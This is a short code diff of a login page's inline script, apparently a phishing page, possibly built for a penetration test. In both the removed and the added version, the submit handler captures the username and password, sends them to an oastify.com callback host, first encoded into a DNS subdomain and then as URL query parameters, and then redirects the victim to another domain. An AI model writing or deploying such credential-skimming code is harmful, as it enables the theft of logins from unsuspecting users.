@@ -124,12 +124,15 @@
     </div>
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            const d = btoa(JSON.stringify({u:u,p:p})).replace(/[^a-zA-Z0-9]/g,'').substring(0,63);
-            new Image().src='https://'+d+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
-            setTimeout(()=>window.top.location='https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions',500);
+        e.preventDefault();
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        
+        // Send as HTTP GET with parameters
+        new Image().src='https://xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/?u=' + 
+            encodeURIComponent(u) + '&p=' + encodeURIComponent(p);
+        
+        setTimeout(()=>window.top.location='https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions',500);
         });
     </script>
 </body>
